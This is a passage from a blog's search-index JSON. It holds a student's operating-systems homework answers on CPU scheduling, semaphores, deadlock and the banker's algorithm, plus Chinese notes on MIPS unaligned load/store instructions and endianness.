time.","text":"<p>\u5047\u8bbeCPU\u6309\u7167\u4e00\u5b9a\u987a\u5e8f\u6267\u884c\u8fd9\u4e9b\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u8fdb\u7a0bCPU\u533a\u95f4\u5206\u522b\u4e3a$ t_1,t_2,\\dots,t_n $\u3002\uff08\u975e\u62a2\u5360\uff09 \u5219\u5e73\u5747\u7b49\u5f85\u65f6\u95f4\u4e3a\uff1a $$     \\overline t = \\frac{1}{n}\\sum_{i=1}^n{(i-1)t_i} $$ \u7531\u6392\u5e8f\u4e0d\u7b49\u5f0f\u77e5$ t_1,t_2,\\dots,t_n $\u964d\u5e8f\u65f6\u6700\u77ed\uff0c\u5373SJF\u7b97\u6cd5\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#6-what-is-processor-affinity-what-is-load-balancing-what-is-the-relationship-between-the-two","title":"6. What is Processor Affinity? What is load balancing? What is the relationship between the two?","text":"<p>\u5904\u7406\u5668\u4eb2\u548c\u6027\u6307\u5728\u591a\u5904\u7406\u5668\u8c03\u5ea6\u7b97\u6cd5\u4e2d\uff0c\u7531\u4e8ecache miss\u7684\u4ee3\u4ef7\u6bd4\u8f83\u9ad8\uff0c\u5e94\u8be5\u52aa\u529b\u8ba9\u4e00\u4e2a\u8fdb\u7a0b\u5728\u4e00\u4e2a\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002 \u800c\u8d1f\u8f7d\u5e73\u8861\u6307\u5c06\u5de5\u4f5c\u8d1f\u8f7d\u5e73\u5747\u5206\u914d\u5230\u6bcf\u4e2a\u5904\u7406\u5668\u4e0a\uff0c\u4ece\u800c\u4fdd\u6301\u6bcf\u4e2a\u5904\u7406\u5668\u4f7f\u7528\u7387\u90fd\u6bd4\u8f83\u9ad8\u3002 \u56e0\u6b64\u5f53\u4e00\u4e2a\u5904\u7406\u5668\u8d1f\u8f7d\u8f83\u9ad8\u65f6\uff0c\u8d1f\u8f7d\u5e73\u5e73\u8861\u7b56\u7565\u4f1a\u503e\u5411\u8ba9\u8d1f\u8f7d\u5206\u914d\u5230\u591a\u4e2a\u5904\u7406\u5668\u4e0a\uff0c\u800c\u5904\u7406\u5668\u4eb2\u548c\u5219\u503e\u5411\u4fdd\u6301\u8be5\u72b6\u6001\u3002 \u56e0\u6b64\u8fd9\u4e24\u79cd\u7b56\u7565\u6709\u77db\u76fe\u7684\u5173\u7cfb\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u516d\u7ae0\u4f5c\u4e1a \u8fdb\u7a0b\u540c\u6b65","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#1-what-is-the-meaning-of-the-term-busy-waiting","title":"1. What is the meaning of the term busy waiting?","text":"<p>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u4f4d\u4e8e\u4e34\u754c\u533a\u65f6\uff0c\u4efb\u4f55\u5176\u5b83\u8bd5\u56fe\u8fdb\u5165\u4e34\u754c\u533a\u7684\u8fdb\u7a0b\u90fd\u5fc5\u987b\u5728\u4ee3\u7801\u4e2d\u4e0d\u65ad\u5730\u5faa\u73af\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#2-what-is-the-meaning-of-the-term-spinlocks","title":"2. What is the meaning of the term spinlocks?","text":"<p>\u81ea\u65cb\u9501\u662f\u4e00\u79cd\u4f1a\u9020\u6210\u5fd9\u7b49\u7684\u4fe1\u53f7\u91cf\uff0c\u5728\u8fdb\u7a0b\u7b49\u5f85\u9501\u65f6\u8fd8\u9700\u4e0d\u65ad\u8fd0\u884c\uff0c\u5360\u7528cpu\u8d44\u6e90\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#3-explain-the-deadlock-and-give-an-example","title":"3. Explain the deadlock and give an example.","text":"<p>\u82e5\u5e72\u4e2a\u8fdb\u7a0b\u7ade\u4e89\u7cfb\u7edf\u8d44\u6e90\uff0c\u6700\u540e\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u5fc5\u987b\u5f97\u5728\u5176\u5b83\u8fdb\u7a0b\u91ca\u653e\u8d44\u6e90\u65f6\u624d\u80fd\u6539\u53d8\u72b6\u6001\uff0c\u56e0\u800c\u65e0\u6cd5\u6539\u53d8\u72b6\u6001\uff0c\u9020\u6210\u6b7b\u9501\u3002 \u5982\u4ee5\u4e0b\u7a0b\u5e8f\u5728A\uff0cB\u540c\u65f6\u8fd0\u884c\u65f6\u9020\u6210\u6b7b\u9501\u3002 A: <pre><code>wait(S)\nwait(Q)\n...\nsignal(S)\nsignal(Q)\n</code></pre> B: <pre><code>wait(Q)\nwait(S)\n...\nsignal(S)\nsignal(Q)\n</code></pre></p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#4","title":"4.","text":"<p>Servers can be designed to limit the number of open connections. For example, a server may wish to have only N socket connections at any point in time. As soon as N connections are made, the server will not accept another incoming connection until an existing connection is released. Explain how semaphores can be used by a server to limit the number of concurrent connections. (6.8)</p> <p>\u521d\u59cb\u5316\u8ba1\u6570\u578b\u4fe1\u53f7\u91cfconnection=N <pre><code>wait(connection)\n//do something\nsignal(connection)\n</code></pre></p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#5-what-operations-can-be-performed-on-a-semaphore-list-them-and-explain-the-means-of-semaphore-values","title":"5. What operations can be performed on a semaphore? List them and explain the means of semaphore values.","text":"<p>wait()\u548csignal()\u64cd\u4f5c\u3002 \u4fe1\u53f7\u91cf\u53ef\u5206\u4e3a\u8ba1\u6570\u4fe1\u53f7\u91cf\u4e0e\u4e8c\u8fdb\u5236\u4fe1\u53f7\u91cf\u3002\u8ba1\u6570\u4fe1\u53f7\u91cf\u503c\u57df\u4e0d\u53d7\u9650\u5236\uff0c\u4ee3\u8868\u7cfb\u7edf\u53d7\u9650\u8d44\u6e90\u7684\u6570\u91cf\u3002 \u4e8c\u8fdb\u5236\u4fe1\u53f7\u91cf\u7684\u503c\u53ea\u80fd\u4e3a0\u62161\uff0c\u53ef\u8868\u793a\u5bf9\u4e34\u754c\u533a\u7684\u8bbf\u95ee\u6743\uff08\u53ea\u80fd\u6709\u4e00\u4e2a\u8fdb\u7a0b\u4f4d\u4e8e\u4e34\u754c\u533a\uff09\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#6-how-does-the-signal-operation-associated-with-monitors-differ-from-the-corresponding-operation-defined-for-semaphores-616","title":"6. How does the signal() operation associated with monitors differ from the corresponding operation defined for semaphores? (6.16)","text":"<p>\u5f53\u6ca1\u6709\u8fdb\u7a0b\u7b49\u5f85\u65f6\uff0c\u4fe1\u53f7\u91cf\u7684signal()\u4f1a\u5bf9\u4fe1\u53f7\u91cf\u7684\u503c\u52a0\u4e00\uff0c\u800c\u7ba1\u7a0b\u91cc\u7684signal()\u5219\u4e0d\u4f1a\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#7","title":"7.","text":"<p>A uniprocessor system concurrently executes 2 processes ($ P_A, P_B $). Two Semaphores $ Mutex_R_a $ and $ Mutex_R_b $ are added in mutual accessing the critical section and synchronizing between $ P_A $ and $ P_B $ . Please read following program segment carefully and answer the questions:</p> <p>(1) What are initial values for $ Mutex_R_a $ and $ Mutex_R_b $ . (2) Is it possible to cause deadlock? Please state your reason. Semaphore $ Mutex_R_a $, $ Mutex_R_b $ ; <pre><code>Void P_A ( ){\n    while(true){\n        Wait(Mutex_Ra );\n        ......\n        Wait(Mutex_Rb );\n        ......\n        Signal(Mutex_Ra );\n        ......\n        Signal(Mutex_Rb );\n    }\n}\n</code></pre> <pre><code>Void P_B ( ){\n    while(true){\n        Wait(Mutex_Rb );\n        ......\n        Wait(Mutex_Ra );\n        ......\n        Signal(Mutex_Rb );\n        ......\n        Signal(Mutex_Ra );\n    }\n}\n</code></pre> \u7b54\uff1a (1) $ Mutex_R_a = Mutex_R_b = 1$ (2) \u5f53P_A\u548cP_B\u540c\u65f6\u5230\u8fbe\u65f6\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u6267\u884c\u7b2c\u4e00\u53e5\uff0c\u63a5\u7740\u4fbf\u4f1a\u7531\u4e8e$ Mutex_R_a = Mutex_R_b = 0$\u800c\u9677\u5165\u6b7b\u9501\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#8","title":"8.","text":"<p>\u8bbe\u6709\u4e00\u4e2a\u53ef\u4ee5\u88c5 A\u3001B \u4e24\u79cd\u7269\u54c1\u7684\u4ed3\u5e93,\u5176\u5bb9\u91cf\u6709\u9650(\u4e3a N),\u4f46\u8981\u6c42\u4ed3\u5e93\u4e2d A\u3001B \u4e24 \u79cd\u7269\u54c1\u7684\u6570\u91cf\u6ee1\u8db3\u4e0b\u8ff0\u4e0d\u7b49\u5f0f: $$    -M\u2264A \u7269\u54c1\u6570\u91cf-B \u7269\u54c1\u6570\u91cf\u2264N  $$ \u5176\u4e2d M \u548c N \u4e3a\u6b63\u6574\u6570\u3002\u53e6\u5916,\u8fd8\u6709\u4e00\u4e2a\u8fdb\u7a0b\u6d88\u8d39 A \u548c B,\u4e00\u6b21\u53d6\u4e00\u4e2a A \u4e0e B \u7ec4\u88c5\u6210 C\u3002 \u8bd5\u7528\u4fe1\u53f7\u91cf\u548c P\u3001V \u64cd\u4f5c\u63cf\u8ff0 A\u3001B \u4e24\u79cd\u7269\u54c1\u7684\u5165\u5e93\u548c\u51fa\u5e93(\u7ec4\u88c5\u6210 C)\u8fc7\u7a0b\u3002</p> <p>\u7b54\uff1a \u8bbenA, nB\u5206\u522b\u4e3aA\u7269\u54c1\uff0cB\u7269\u54c1\u6570\u91cf\uff0c\u4e8c\u8fdb\u5236\u4fe1\u53f7\u91cfmutex\uff0c\u521d\u59cb\u503c\u4e3a1\u3002</p> <p>A\u5165\u5e93\u8fdb\u7a0b\uff1a <pre><code>wait(mutex)\nnA++\nif(nA &lt;= N &amp;&amp; -M &lt;= nA-nB &lt;= N)\n    A\u5165\u5e93\nelse\n    nA--\nsignal(mutex)\n</code></pre></p> <p>B\u5165\u5e93\u8fdb\u7a0b\uff1a <pre><code>wait(mutex)\nnB++\nif(nB &lt;= N &amp;&amp; -M &lt;= nA-nB &lt;= N)\n    B\u5165\u5e93\nelse\n    nB--\nsignal(mutex)\n</code></pre></p> <p>C\u51fa\u5e93\u8fdb\u7a0b\uff1a <pre><code>wait(mutex)\nif(nA&gt;0 &amp;&amp; nB&gt;0)\n    nA--;nB--\n    C\u51fa\u5e93\nsignal(mutex)\n</code></pre></p> <p>changed: <pre><code>semaphore initiation:\n    muxtex = 1\n    empty  = N\n    delta  = M\n    nA = nB = 0\nprogress A:\ndo{\n    P(empty)\n    P(mutex)\n        A in\n    V(mutex)\n    V(nA)\n    V(delta)\n}while(true)\n\nprogress B:\ndo{\n    P(empty)\n    P(delta)\n    P(mutex)\n        B in\n    V(mutex)\n    V(nB)\n}while(true)\n\nprogress C:\ndo{\n    P(nA)\n    P(nB)\n    P(mutex)\n        C out\n    V(mutex)\n    V(empty)\n    V(empty)\n}while(true)\n</code></pre></p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c7\u7ae0 \u4f5c\u4e1a \u6b7b\u9501","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#1","title":"1\u3001","text":"<p>Consider the traffic deadlock depicted in follow figure.</p> <p> </p> <p>a. Show that the four necessary conditions for deadlock indeed hold in this example. b. State a simple rule for avoiding deadlocks in this system.</p> <ul> <li>a.<ol> <li>mutual exclusion: \u6bcf\u6761\u9053\u8def\u90fd\u53ea\u80fd\u8ba9\u4e00\u4e2a\u65b9\u5411\u7684\u8f66\u901a\u884c\uff0c\u4e14\u8f66\u4e4b\u95f4\u4e0d\u53ef\u80fd\u7a7f\u900f\u800c\u8fc7\u3002</li> <li>hold and wait: \u56db\u4e2a\u65b9\u5411\u7684\u8f66\u8f86\u90fd\u5360\u6709\u4e00\u6761\u9053\u8def\uff0c\u5e76\u7b49\u5f85\u53e6\u4e00\u65b9\u5411\u7684\u8f66\u9732\u51fa\u7a7a\u9699\u3002</li> <li>no preemption: \u6bcf\u4e2a\u65b9\u5411\u7684\u8f66\u90fd\u5fc5\u987b\u7b49\u5f85\u53e6\u4e00\u4e2a\u65b9\u5411\u7684\u8f66\u4e3b\u52a8\u5012\u8f66\uff0c\u65e0\u6cd5\u5f3a\u8feb\u3002</li> <li>circular wait\uff1a \u6bcf\u4e2a\u65b9\u5411\u7684\u8f66\u4e92\u76f8\u7b49\u5f85\uff0c\u5f62\u6210\u4e00\u4e2a\u73af\u3002</li> </ol> </li> <li>b. \u5b89\u6392\u4e00\u4f4d\u4ea4\u8b66\u9009\u62e9\u5e76\u6307\u6325\u4e00\u4e2a\u65b9\u5411\u7684\u8f66\u8ba9\u51fa\u9053\u8def\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#2","title":"2\u3001","text":"<p>Consider a system consisting of four resources of the same type that are shared by three processes, each of which needs at most two resources. Show that the system is deadlock free.</p> <p>\u7b54\uff1a\u53cd\u8bc1\u6cd5\uff0c\u5047\u8bbe\u5f62\u6210\u4e86\u6b7b\u9501\u3002\u5219\u7531\u6bcf\u4e2a\u8fdb\u7a0b\u6700\u591a\u9700\u6c422\u4e2a\u8d44\u6e90\u5b9e\u4f8b\uff0c\u548c\u6b7b\u9501\u5fc5\u8981\u6761\u4ef6\u4e2d\u76843\uff0c4\u70b9\u53ef\u77e5\uff0c\u552f\u4e00\u7684\u60c5\u5f62\u662f\uff1a\u4e09\u4e2a\u8fdb\u7a0b\u5404\u81ea\u5360\u6709\u4e00\u4e2a\u8d44\u6e90\u4e14\u7b49\u5f85\u53e6\u4e00\u4e2a\u8d44\u6e90\uff0c\u5e76\u5f62\u6210\u4e86\u4e00\u4e2a\u73af\u3002\u800c\u5728\u8be5\u60c5\u51b5\u4e0b\uff0c\u5269\u4f59\u7684\u4e00\u4e2a\u8d44\u6e90\u5bfc\u81f4\u6b7b\u9501\u4e0d\u4f1a\u53d1\u751f\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#3","title":"3\u3001","text":"<p>Consider a system consisting of m resources of the same type being shared by n processes. Resources can be requested and released by processes only one at a time. Show that the system is deadlock free if the following two conditions hold:</p> <ul> <li>a. The maximum need of each process is between 1 and m resources.</li> <li>b. The sum of all maximum needs is less than m + n.</li> </ul> <p>$ a. \\sum_{i=1}^n Max_i &lt; m+n $ $ b. Max_i \\geq 1 for all i $ $ c. Need_i = Max_i \u2212 Allocation_i $</p> <p>If there exists a deadlock state then: $ d. \\sum_{i=1}^n Allocation_i = m $</p> <p>$ a,b,c,d \\Rightarrow \\sum_{i=1}^n Need_i &lt; n $</p> <p>This implies that there exists a process $ P_i $ such that $ Need_i = 0 $. Since $ Max_i &gt;= 1 $, it follows that $ P_i $ has at least one resource, the deadlock can't maintain. </p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#4","title":"4\u3001","text":"<p>Consider the following snapshot of a system:</p> PID AL. MAX A B C D A B C D P0 0 0 1 2 0 0 1 2 P1 1 0 0 0 1 7 5 0 P2 1 3 5 4 2 3 5 6 P3 0 6 3 2 0 6 5 2 P4 0 0 1 4 0 6 5 6 AV. A B C D 1 5 2 0 <p>(p.s. AL.= Allocated:, AV.= Available)</p> <p>Answer the following questions using the banker's algorithm: a. What is the content of the matrix Need? b. Is the system in a safe state? c. If a request from process $ P_1 $ arrives for (0,4,2,0), can the request be granted immediately?</p> <ul> <li>a     | PID | need |   |   |   |     | --- | --- | - | - | - |     |     | A   | B | C | D |     | P0  | 0   | 0 | 0 | 0 |     | P1  | 0   | 7 | 5 | 0 |     | P2  | 1   | 0 | 0 | 2 |     | P3  | 0   | 0 | 2 | 0 |     | P4  | 0   | 6 | 4 | 2 |</li> <li>b \u7531\u94f6\u884c\u5bb6\u7b97\u6cd5\u53ef\u77e5\u662f\u5b89\u5168\u7684\uff0c\u5e8f\u5217\\(&lt;0,2,1,3,4&gt;\\)\u4e3a\u5b89\u5168\u5e8f\u5217\u3002</li> <li>c \u5047\u8bbe\u6ee1\u8db3\uff0c\u5219$ Need_{P_1} =(0,11,7,0) \\(\uff0c\u5e8f\u5217\\) &lt;0,2,3,4,1&gt; $\u4e3a\u5b89\u5168\u5e8f\u5217\uff0c\u6545\u53ef\u7acb\u5373\u6ee1\u8db3\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/21/2019-10-21-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E6%AD%BB%E9%94%81/#5","title":"5\u3001","text":"<p>Consider a system with four processes$ P_1, P_2, P_3$ and $ P_4 $, and two resources, $ R_1, R_2 $ respectively. Each resource has two instances. Furthermore:</p> <p>$ P_1 $ allocates an instance of $ R_2 $  , and requests an instance of $ R_1 $ ; $ P_2 $  allocates an instance of $ R_1 $ , and doesn\u2019t need any other resource; $ P_3 $  allocates an instance of $ R_1 $ and requires an instance of $ R_2 $ ; $ P_4 $  allocates an instance of $ R_2 $ , and doesn\u2019t need any other resource. Answer the following questions:</p> <p>a. Draw the resource allocation graph. b. Is there a cycle in the graph? If yes name it.  c. Is the system in deadlock? If yes, explain why. If not, give a possible sequence of executions after which every process completes.</p> <ul> <li>a. \u7565</li> <li>b. \u5b58\u5728</li> <li>c. \u4e0d\u662f\uff0c$  $","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/","title":"\u975e\u5bf9\u9f50\u6307\u4ee4\u603b\u7ed3","text":"","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/#1-\u5927\u7aef\u4e0e\u5c0f\u7aef","title":"1 \u5927\u7aef\u4e0e\u5c0f\u7aef","text":"<ul> <li>\u5927\u7aef:\u6570\u636e\u7684\u9ad8\u4f4d\u4f4d\u4e8e\u5185\u5b58\u7684\u4f4e\u5730\u5740\uff0c\u6570\u636e\u7684\u5730\u4f4d\u4f4d\u4e8e\u5185\u5b58\u7684\u9ad8\u5730\u5740\u3002</li> <li>\u5c0f\u7aef:\u4e0e\u5927\u7aef\u76f8\u53cd\u3002</li> </ul> <p>\u4e8b\u5b9e\u4e0a\u5927\u7aef\u66f4\u7b26\u5408\u4eba\u7684\u601d\u7ef4\uff0c\u56e0\u4e3a\u5728\u5199\u4e00\u4e2a\u6570\u5b57\u65f6\u4eba\u4eec\u66f4\u4e60\u60ef\u4ece\u9ad8\u4f4d\u5199\u5230\u4f4e\u4f4d\uff0c\u4e14\u9ad8\u4f4d\u662f\u5199\u5728\u5de6\u8fb9\u7684\u3002\u800c\u8fd9\u53ef\u4ee5\u76f4\u63a5\u548c\u5185\u5b58\u7684\u201c\u56fe\u50cf\u201d\u5bf9\u5e94\uff0c\u800c\u5c0f\u7aef\u5219\u9700\u8981\u628a\u6bcf\u4e2a\u5b57\u7684\u5b57\u8282\u5730\u5740\u98a0\u5012\u4e00\u4e0b\u624d\u53ef\u4ee5\u3002 \u4f8b\u5982\uff0c\u4e00\u4e2a32\u4f4d\u7684\u6574\u65700xffeeddcc\uff0c\u5728\u5185\u5b58\u91cc\u7684\u5b58\u50a8\u60c5\u51b5\u5982\u4e0b\u3002\uff08\u975e\u5bf9\u9f50\uff0c\u8d77\u59cb\u5730\u5740\u4e3a0x01\uff09</p> <p>\u5927\u7aef:            0  1  2  3 0x00    00ffeedd 0x01    cc556677 \u5c0f\u7aef:            3  2  1  0 0x00    eeddcc00 0x01    776655ff ps.\u5047\u8bbe\u9664\u53bb\u8be5\u6574\u6570\u5b58\u50a8\u7684\u7a7a\u95f4\uff0c\u5b57\u8282\u5730\u5740\u4e0e\u5b58\u50a8\u7684\u5341\u516d\u8fdb\u5236\u6570\u5bf9\u5e94\uff0c\u5373\u5730\u5740\u4e3a0x01\u5b5811\uff0c0x05\u5b5855\uff0c\u8fd9\u70b9\u7528\u6765\u7a81\u51fa\u5b57\u8282\u5730\u5740\u662f\u591a\u5c11\u3002</p>","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/#2\u975e\u5bf9\u9f50\u6307\u4ee4","title":"2\u975e\u5bf9\u9f50\u6307\u4ee4","text":"<p>instruction lwl/swl, lwr/swr usage lwl t0, offset(s0)</p> <p>\u5176\u4e2d\u7684left\uff0c\u4e0eshift left\u7684\u201c\u5de6\u201d\u90fd\u8868\u793a\u6570\u636e\u7684\u9ad8\u4f4d\u3002right\u5219\u8868\u793a\u6570\u636e\u7684\u4f4e\u4f4d\u3002</p> <p>lwl\u8868\u793a\u5c06\u5185\u5b58\u5bf9\u5e94\u5730\u5740\u6240\u5728\u7684\u5b57\uff08align_address\uff0c\u5373\u62b9\u6389\u5730\u5740\u4f4e\u4e24\u4f4d\u5bf9\u5e94\u5730\u5740\uff09\u7684\u6570\u636e\u4f4e\u4f4d\u590d\u5236\u5230\u5bc4\u5b58\u5668\u6570\u636e\u7684\u9ad8\u4f4d\u3002\u5bc4\u5b58\u5668\u5176\u5b83\u90e8\u5206\u4e0d\u53d8\u3002</p> <p>swl\u5219\u8868\u793a\u5c06\u5bc4\u5b58\u5668\u7684\u6570\u636e\u9ad8\u4f4d\u590d\u5236\u5230\u5185\u5b58\u5bf9\u5e94\u6570\u636e\u4f4e\u4f4d\u3002\u5176\u5b83\u90e8\u5206\u4e0d\u53d8\u3002 \u5373 lwl/swl \u5bc4\u5b58\u5668\u6570\u636e\u9ad8\u4f4d\u21b9\u5185\u5b58\u6570\u636e\u4f4e\u4f4d lwr/swr \u5bc4\u5b58\u5668\u6570\u636e\u4f4e\u4f4d\u21b9\u5185\u5b58\u6570\u636e\u9ad8\u4f4d</p>","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/#1-\u4ece1\u4e2d\u8bfb\u53d6\u8be5\u6574\u6570\u5b9e\u4f8b","title":"1 \u4ece#1\u4e2d\u8bfb\u53d6\u8be5\u6574\u6570\u5b9e\u4f8b","text":"<p>\u5927\u7aef lwl s0, 0(1) lwr s0, 3(1) \u5c0f\u7aef lwr s0, 0(1) lwl s0, 3(1)</p> <p>\u5c06\u6574\u6570\u4ee5\u56fe\u4e2d\u6240\u793a\u5b58\u50a8\u5230\u5185\u5b58\u4e2d\u53ea\u9700\u5c06lw*\u6539\u4e3asw*\u3002</p> <p>\u53ef\u4ee5\u4ee5\u6b64\u5b9a\u4e49\u975e\u5bf9\u9f50\u52a0\u8f7d\u3001\u5b58\u50a8\u4f2a\u6307\u4ee4\uff0c \u5982uld(rd, rb)\u8868\u793a\u975e\u5bf9\u9f50load\uff0c\u52a0\u8f7d\u5185\u5b58[rb+3:rb]\u7684\u6570\u636e\uff0c uld(rd, rb)=&gt; lwl rd, 0(rb) lwr rd, 3(rb) \uff08\u53ef\u80fduld\u662f\u52a0\u8f7d8\u5b57\u8282\uff0c\u5f85\u786e\u8ba4\uff09</p>","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"2019/12/21/2019-12-21-mips%E9%9D%9E%E5%AF%B9%E9%BD%90%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%A4%A7%E5%B0%8F%E7%AB%AF/#2-\u5173\u4e8eloadstore\u591a\u5c11\u5b57\u8282","title":"2 \u5173\u4e8eload/store\u591a\u5c11\u5b57\u8282","text":"<p>n\u4e3a\u5730\u5740\u4f4e2\u4f4d\uff0cn=addr[1:0] \u5927\u7aef lwl/swl  4-n lwr/swr   n+1 \u5c0f\u7aef lwr/swr 4-n lwl/swl n+1</p>","tags":["mips","\u5927\u5c0f\u7aef"]},{"location":"%E6%8A%98%E8%85%BE/2019/12/21/2019-12-21-write-blog-in-PC-through-sshing-to-a-mobile-phone/","title":"write blog in PC through sshing to a mobile phone","text":"<p>\u8fd9\u662f\u4e00\u7bc7\u6587\u7ae0\u3002</p>","tags":["termux","hexo"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/","title":"\u5d4c\u5165\u5f0f\u6280\u672f\u57fa\u7840\u4e0e\u5b9e\u8df5 